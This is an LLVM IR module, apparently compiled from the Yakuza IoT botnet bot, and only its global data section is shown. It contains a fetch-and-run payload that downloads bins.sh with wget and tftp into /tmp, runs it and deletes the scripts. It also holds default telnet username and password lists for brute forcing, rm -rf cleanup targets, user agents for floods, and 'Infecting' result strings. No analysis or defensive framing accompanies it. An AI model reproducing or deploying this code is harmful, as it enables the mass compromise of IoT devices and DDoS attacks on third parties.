; ModuleID = 'host/ir_sub/Yakuza.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.in_addr = type { i32 }
%struct.fd_set = type { [16 x i64] }
%struct.timeval = type { i64, i64 }
%struct.telstate_t = type { i32, i32, i8, i8, i8, i8, i8, i32, i16, i8* }
%struct.__va_list_tag = type { i32, i32, i8*, i8* }
%struct.hostent = type { i8*, i8**, i32, i32, i8** }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }
%struct.tcphdr = type { %union.anon }
%union.anon = type { %struct.anon }
%struct.anon = type { i16, i16, i32, i32, i8, i8, i16, i16, i16 }
%struct.tcp_pseudo = type { i64, i64, i8, i8, i16 }
%struct.udphdr = type { %union.anon.1 }
%union.anon.1 = type { %struct.anon.2 }
%struct.anon.2 = type { i16, i16, i16, i16 }
%struct.anon.0 = type { i16, i16, i32, i32, i16, i16, i16, i16 }
%struct._IO_FILE = type { i32, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, %struct._IO_marker*, %struct._IO_FILE*, i32, i32, i64, i16, i8, [1 x i8], i8*, i64, i8*, i8*, i8*, i8*, i64, i32, [20 x i8] }
%struct._IO_marker = type { %struct._IO_marker*, %struct._IO_FILE*, i32 }

@commServer = global [1 x i8*] [i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str, i32 0, i32 0)], align 8
@.str = private unnamed_addr constant [13 x i8] c"127.0.0.1:23\00", align 1
@payload = global i8* getelementptr inbounds ([132 x i8], [132 x i8]* @.str.1, i32 0, i32 0), align 8
@.str.1 = private unnamed_addr constant [132 x i8] c"cd /tmp; wget http://127.0.0.1/bins.sh; chmod 777 *; sh bins.sh; tftp -g 127.0.0.1 -r tftp.sh; chmod 777 *; sh tftp.sh; rm -rf *.sh\00", align 1
@tel_usernames = global [6 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.2, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.3, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.4, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.5, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.7, i32 0, i32 0)], align 16
@.str.2 = private unnamed_addr constant [6 x i8] c"root\00\00", align 1
@.str.3 = private unnamed_addr constant [7 x i8] c"admin\00\00", align 1
@.str.4 = private unnamed_addr constant [6 x i8] c"user\00\00", align 1
@.str.5 = private unnamed_addr constant [7 x i8] c"login\00\00", align 1
@.str.6 = private unnamed_addr constant [7 x i8] c"guest\00\00", align 1
@.str.7 = private unnamed_addr constant [22 x i8] c"support\00default\00root\00\00", align 1
@tel_passwords = global [6 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.2, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.3, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.4, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.5, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.8, i32 0, i32 0)], align 16
@.str.8 = private unnamed_addr constant [23 x i8] c"support\00default\00admin\00\00", align 1
@tempdirs = global [10 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.9, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.10, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.11, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.12, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.13, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.14, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.15, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.16, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.17, i32 0, i32 0), i8* null], align 16
@.str.9 = private unnamed_addr constant [7 x i8] c"/tmp/*\00", align 1
@.str.10 = private unnamed_addr constant [7 x i8] c"/var/*\00", align 1
@.str.11 = private unnamed_addr constant [11 x i8] c"/var/run/*\00", align 1
@.str.12 = private unnamed_addr constant [11 x i8] c"/var/tmp/*\00", align 1
@.str.13 = private unnamed_addr constant [16 x i8] c"/dev/netslink/*\00", align 1
@.str.14 = private unnamed_addr constant [7 x i8] c"/dev/*\00", align 1
@.str.15 = private unnamed_addr constant [11 x i8] c"/dev/shm/*\00", align 1
@.str.16 = private unnamed_addr constant [7 x i8] c"/usr/*\00", align 1
@.str.17 = private unnamed_addr constant [7 x i8] c"/opt/*\00", align 1
@advances = global [16 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.18, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.19, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.21, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.22, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.23, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.24, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.25, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.26, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.27, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.28, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.29, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.30, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.31, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.32, i32 0, i32 0), i8* null], align 16
@.str.18 = private unnamed_addr constant [8 x i8] c"mdm9625\00", align 1
@.str.19 = private unnamed_addr constant [9 x i8] c"9615-cdp\00", align 1
@.str.20 = private unnamed_addr constant [5 x i8] c"F600\00", align 1
@.str.21 = private unnamed_addr constant [5 x i8] c"F660\00", align 1
@.str.22 = private unnamed_addr constant [5 x i8] c"F609\00", align 1
@.str.23 = private unnamed_addr constant [4 x i8] c"BCM\00", align 1
@.str.24 = private unnamed_addr constant [2 x i8] c":\00", align 1
@.str.25 = private unnamed_addr constant [5 x i8] c"user\00", align 1
@.str.26 = private unnamed_addr constant [5 x i8] c"ogin\00", align 1
@.str.27 = private unnamed_addr constant [5 x i8] c"name\00", align 1
@.str.28 = private unnamed_addr constant [5 x i8] c"pass\00", align 1
@.str.29 = private unnamed_addr constant [7 x i8] c"dvrdvs\00", align 1
@.str.30 = private unnamed_addr constant [5 x i8] c"nter\00", align 1
@.str.31 = private unnamed_addr constant [5 x i8] c"User\00", align 1
@.str.32 = private unnamed_addr constant [8 x i8] c"welcome\00", align 1
@fails = global [11 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.33, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.34, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.35, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.36, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.37, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.38, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.39, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.40, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.41, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.42, i32 0, i32 0), i8* null], align 16
@.str.33 = private unnamed_addr constant [7 x i8] c"nvalid\00", align 1
@.str.34 = private unnamed_addr constant [6 x i8] c"ailed\00", align 1
@.str.35 = private unnamed_addr constant [9 x i8] c"ncorrect\00", align 1
@.str.36 = private unnamed_addr constant [6 x i8] c"enied\00", align 1
@.str.37 = private unnamed_addr constant [5 x i8] c"rror\00", align 1
@.str.38 = private unnamed_addr constant [7 x i8] c"oodbye\00", align 1
@.str.39 = private unnamed_addr constant [4 x i8] c"bad\00", align 1
@.str.40 = private unnamed_addr constant [7 x i8] c"ailure\00", align 1
@.str.41 = private unnamed_addr constant [4 x i8] c"bye\00", align 1
@.str.42 = private unnamed_addr constant [5 x i8] c"exit\00", align 1
@successes = global [18 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.43, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.44, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.45, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.46, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.29, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.18, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.19, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.21, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.22, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.47, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.48, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.49, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.50, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.51, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.52, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.23, i32 0, i32 0), i8* null], align 16
@.str.43 = private unnamed_addr constant [8 x i8] c"busybox\00", align 1
@.str.44 = private unnamed_addr constant [2 x i8] c"$\00", align 1
@.str.45 = private unnamed_addr constant [2 x i8] c"#\00", align 1
@.str.46 = private unnamed_addr constant [6 x i8] c"shell\00", align 1
@.str.47 = private unnamed_addr constant [2 x i8] c">\00", align 1
@.str.48 = private unnamed_addr constant [8 x i8] c"version\00", align 1
@.str.49 = private unnamed_addr constant [2 x i8] c"v\00", align 1
@.str.50 = private unnamed_addr constant [7 x i8] c"system\00", align 1
@.str.51 = private unnamed_addr constant [8 x i8] c"command\00", align 1
@.str.52 = private unnamed_addr constant [5 x i8] c"help\00", align 1
@advances2 = global [11 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.33, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.34, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.35, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.36, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.37, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.38, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.39, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.43, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.44, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.45, i32 0, i32 0), i8* null], align 16
@mainCommSock = global i32 0, align 4
@currentServer = global i32 -1, align 4
@numpids = global i64 0, align 8
@macAddress = global [6 x i8] zeroinitializer, align 1
@uagents = global [59 x i8*] [i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.54, i32 0, i32 0), i8* getelementptr inbounds ([85 x i8], [85 x i8]* @.str.55, i32 0, i32 0), i8* getelementptr inbounds ([150 x i8], [150 x i8]* @.str.56, i32 0, i32 0), i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.57, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.58, i32 0, i32 0), i8* getelementptr inbounds ([55 x i8], [55 x i8]* @.str.59, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.60, i32 0, i32 0), i8* getelementptr inbounds ([85 x i8], [85 x i8]* @.str.61, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([48 x i8], [48 x i8]* @.str.63, i32 0, i32 0), i8* getelementptr inbounds ([107 x i8], [107 x i8]* @.str.64, i32 0, i32 0), i8* getelementptr inbounds ([101 x i8], [101 x i8]* @.str.65, i32 0, i32 0), i8* getelementptr inbounds ([63 x i8], [63 x i8]* @.str.66, i32 0, i32 0), i8* getelementptr inbounds ([101 x i8], [101 x i8]* @.str.67, i32 0, i32 0), i8* getelementptr inbounds ([83 x i8], [83 x i8]* @.str.68, i32 0, i32 0), i8* getelementptr inbounds ([173 x i8], [173 x i8]* @.str.69, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.70, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @.str.71, i32 0, i32 0), i8* getelementptr inbounds ([109 x i8], [109 x i8]* @.str.72, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @.str.73, i32 0, i32 0), i8* getelementptr inbounds ([144 x i8], [144 x i8]* @.str.74, i32 0, i32 0), i8* getelementptr inbounds ([60 x i8], [60 x i8]* @.str.75, i32 0, i32 0), i8* getelementptr inbounds ([103 x i8], [103 x i8]* @.str.76, i32 0, i32 0), i8* getelementptr inbounds ([100 x i8], [100 x i8]* @.str.77, i32 0, i32 0), i8* getelementptr inbounds ([65 x i8], [65 x i8]* @.str.78, i32 0, i32 0), i8* getelementptr inbounds ([154 x i8], [154 x i8]* @.str.79, i32 0, i32 0), i8* getelementptr inbounds ([112 x i8], [112 x i8]* @.str.80, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @.str.81, i32 0, i32 0), i8* getelementptr inbounds ([65 x i8], [65 x i8]* @.str.82, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.83, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.84, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.85, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.86, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.87, i32 0, i32 0), i8* getelementptr inbounds ([110 x i8], [110 x i8]* @.str.88, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.89, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.90, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.91, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.92, i32 0, i32 0), i8* getelementptr inbounds ([101 x i8], [101 x i8]* @.str.93, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.94, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.95, i32 0, i32 0), i8* getelementptr inbounds ([101 x i8], [101 x i8]* @.str.93, i32 0, i32 0), i8* getelementptr inbounds ([70 x i8], [70 x i8]* @.str.96, i32 0, i32 0), i8* getelementptr inbounds ([75 x i8], [75 x i8]* @.str.97, i32 0, i32 0), i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.98, i32 0, i32 0), i8* getelementptr inbounds ([71 x i8], [71 x i8]* @.str.99, i32 0, i32 0), i8* getelementptr inbounds ([128 x i8], [128 x i8]* @.str.100, i32 0, i32 0), i8* getelementptr inbounds ([65 x i8], [65 x i8]* @.str.101, i32 0, i32 0), i8* getelementptr inbounds ([76 x i8], [76 x i8]* @.str.102, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.103, i32 0, i32 0), i8* getelementptr inbounds ([65 x i8], [65 x i8]* @.str.104, i32 0, i32 0), i8* getelementptr inbounds ([100 x i8], [100 x i8]* @.str.105, i32 0, i32 0), i8* getelementptr inbounds ([90 x i8], [90 x i8]* @.str.106, i32 0, i32 0), i8* getelementptr inbounds ([111 x i8], [111 x i8]* @.str.107, i32 0, i32 0), i8* getelementptr inbounds ([110 x i8], [110 x i8]* @.str.108, i32 0, i32 0), i8* getelementptr inbounds ([122 x i8], [122 x i8]* @.str.109, i32 0, i32 0), i8* getelementptr inbounds ([116 x i8], [116 x i8]* @.str.110, i32 0, i32 0), i8* getelementptr inbounds ([111 x i8], [111 x i8]* @.str.111, i32 0, i32 0)], align 16
@.str.54 = private unnamed_addr constant [115 x i8] c"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36\00", align 1
@.str.55 = private unnamed_addr constant [85 x i8] c"FAST-WebCrawler/3.6 (atw-crawler at fast dot no; http://fast.no/support/crawler.asp)\00", align 1
@.str.56 = private unnamed_addr constant [150 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)\00", align 1
@.str.57 = private unnamed_addr constant [31 x i8] c"TheSuBot/0.2 (www.thesubot.de)\00", align 1
@.str.58 = private unnamed_addr constant [73 x i8] c"Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16\00", align 1
@.str.59 = private unnamed_addr constant [55 x i8] c"BillyBobBot/1.0 (+http://www.billybobbot.com/crawler/)\00", align 1
@.str.60 = private unnamed_addr constant [64 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201\00", align 1
@.str.61 = private unnamed_addr constant [85 x i8] c"FAST-WebCrawler/3.7 (atw-crawler at fast dot no; http://fast.no/support/crawler.asp)\00", align 1
@.str.62 = private unnamed_addr constant [89 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1\00", align 1
@.str.63 = private unnamed_addr constant [48 x i8] c"zspider/0.9-dev http://feedback.redkolibri.com/\00", align 1
@.str.64 = private unnamed_addr constant [107 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)\00", align 1
@.str.65 = private unnamed_addr constant [101 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)\00", align 1
@.str.66 = private unnamed_addr constant [63 x i8] c"Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51\00", align 1
@.str.67 = private unnamed_addr constant [101 x i8] c"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36\00", align 1
@.str.68 = private unnamed_addr constant [83 x i8] c"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3\00", align 1
@.str.69 = private unnamed_addr constant [173 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194ABaiduspider+(+http://www.baidu.com/search/spider.htm)\00", align 1
@.str.70 = private unnamed_addr constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko\00", align 1
@.str.71 = private unnamed_addr constant [80 x i8] c"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko/20090327 Galeon/2.0.7\00", align 1
@.str.72 = private unnamed_addr constant [109 x i8] c"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Windows; U; Windows NT 5.1; en) AppleWebKit/886; U; en) Presto/2.4.15\00", align 1
@.str.73 = private unnamed_addr constant [82 x i8] c"Mozilla/5.0 (Android; Linux armv7l; rv:9.0) Gecko/20111216 Firefox/9.0 Fennec/9.0\00", align 1
@.str.74 = private unnamed_addr constant [144 x i8] c"Mozilla/5.0 (iPhone; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10\00", align 1
@.str.75 = private unnamed_addr constant [60 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3)\00", align 1
@.str.76 = private unnamed_addr constant [103 x i8] c"Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)\00", align 1
@.str.77 = private unnamed_addr constant [100 x i8] c"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5\00", align 1
@.str.78 = private unnamed_addr constant [65 x i8] c"Opera/9.80 (Windows NT 5.1; U; en) Presto/2.10.229 Version/11.60\00", align 1
@.str.79 = private unnamed_addr constant [154 x i8] c"Mozilla/5.0 (iPad; U; CPU OS 5_1 like Mac OS X) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B367 Safari/531.21.10 UCBrowser/3.4.3.532\00", align 1
@.str.80 = private unnamed_addr constant [112 x i8] c"Mozilla/5.0 (Nintendo WiiU) AppleWebKit/536.30 (KHTML, like Gecko) NX/3.0.4.2.12 NintendoBrowser/4.3.1.11264.US\00", align 1
@.str.81 = private unnamed_addr constant [82 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:25.0) Gecko/20100101 Firefox/25.0\00", align 1
@.str.82 = private unnamed_addr constant [65 x i8] c"Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)\00", align 1
@.str.83 = private unnamed_addr constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; pl) Opera 11.00\00", align 1
@.str.84 = private unnamed_addr constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; en) Opera 11.00\00", align 1
@.str.85 = private unnamed_addr constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; ja) Opera 11.00\00", align 1
@.str.86 = private unnamed_addr constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; cn) Opera 11.00\00", align 1
@.str.87 = private unnamed_addr constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; fr) Opera 11.00\00", align 1
@.str.88 = private unnamed_addr constant [110 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36\00", align 1
@.str.89 = private unnamed_addr constant [68 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; FSL 7.0.6.01001)\00", align 1
@.str.90 = private unnamed_addr constant [68 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; FSL 7.0.7.01001)\00", align 1
@.str.91 = private unnamed_addr constant [68 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; FSL 7.0.5.01003)\00", align 1
@.str.92 = private unnamed_addr constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:12.0) Gecko/20100101 Firefox/12.0\00", align 1
@.str.93 = private unnamed_addr constant [101 x i8] c"Mozilla/5.0 (X11; U; Linux x86_64; de; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8\00", align 1
@.str.94 = private unnamed_addr constant [68 x i8] c"Mozilla/5.0 (Windows NT 5.1; rv:13.0) Gecko/20100101 Firefox/13.0.1\00", align 1
@.str.95 = private unnamed_addr constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:11.0) Gecko/20100101 Firefox/11.0\00", align 1
@.str.96 = private unnamed_addr constant [70 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; .NET CLR 1.0.3705)\00", align 1
@.str.97 = private unnamed_addr constant [75 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.0) Gecko/20100101 Firefox/13.0.1\00", align 1
@.str.98 = private unnamed_addr constant [84 x i8] c"Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)\00", align 1
@.str.99 = private unnamed_addr constant [71 x i8] c"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)\00", align 1
@.str.100 = private unnamed_addr constant [128 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)\00", align 1
@.str.101 = private unnamed_addr constant [65 x i8] c"Opera/9.80 (Windows NT 5.1; U; en) Presto/2.10.289 Version/12.01\00", align 1
@.str.102 = private unnamed_addr constant [76 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)\00", align 1
@.str.103 = private unnamed_addr constant [68 x i8] c"Mozilla/5.0 (Windows NT 5.1; rv:5.0.1) Gecko/20100101 Firefox/5.0.1\00", align 1
@.str.104 = private unnamed_addr constant [65 x i8] c"Mozilla/5.0 (Windows NT 6.1; rv:5.0) Gecko/20100101 Firefox/5.02\00", align 1
@.str.105 = private unnamed_addr constant [100 x i8] c"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.112 Safari/535.1\00", align 1
@.str.106 = private unnamed_addr constant [90 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; MSIE 5.5; Windows NT 5.0) Opera 7.02 Bork-edition [en]\00", align 1
@.str.107 = private unnamed_addr constant [111 x i8] c"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36\00", align 1
@.str.108 = private unnamed_addr constant [110 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36\00", align 1
@.str.109 = private unnamed_addr constant [122 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36\00", align 1
@.str.110 = private unnamed_addr constant [116 x i8] c"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36\00", align 1
@.str.111 = private unnamed_addr constant [111 x i8] c"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36\00", align 1
@pids = common global i32* null, align 8
@ourIP = common global %struct.in_addr zeroinitializer, align 4
@scanPid = common global i32 0, align 4
@.str.53 = private unnamed_addr constant [7 x i8] c"x86_64\00", align 1
@Q = internal global [4096 x i32] zeroinitializer, align 16
@rand_cmwc.i = internal global i32 4095, align 4
@c = internal global i32 362436, align 4
@.str.209 = private unnamed_addr constant [7 x i8] c"(null)\00", align 1
@.str.112 = private unnamed_addr constant [4 x i8] c"%s\0A\00", align 1
@.str.113 = private unnamed_addr constant [7 x i8] c":>%$#\00\00", align 1
@getRandomPublicIP.ipState = internal global [4 x i8] zeroinitializer, align 1
@.str.114 = private unnamed_addr constant [12 x i8] c"%d.%d.%d.%d\00", align 1
@TelnetIPRanges.ipState = internal global [4 x i8] zeroinitializer, align 1
@.str.115 = private unnamed_addr constant [3 x i8] c"\0D\0A\00", align 1
@.str.116 = private unnamed_addr constant [72 x i8] c"[ Yakuza ] Result || IP: %s || Port: 23 || Username: %s || Password: %s\00", align 1
@.str.117 = private unnamed_addr constant [11 x i8] c"rm -rf %s;\00", align 1
@.str.118 = private unnamed_addr constant [81 x i8] c"[ Yakuza ] Cleaning Device || IP: %s || Port: 23 || Username: %s || Password: %s\00", align 1
@.str.119 = private unnamed_addr constant [5 x i8] c"sh\0D\0A\00", align 1
@.str.120 = private unnamed_addr constant [8 x i8] c"shell\0D\0A\00", align 1
@.str.121 = private unnamed_addr constant [75 x i8] c"[ Yakuza ] Infecting || IP: %s || Port: 23 || Username: %s || Password: %s\00", align 1
@.str.122 = private unnamed_addr constant [10 x i8] c"connected\00", align 1
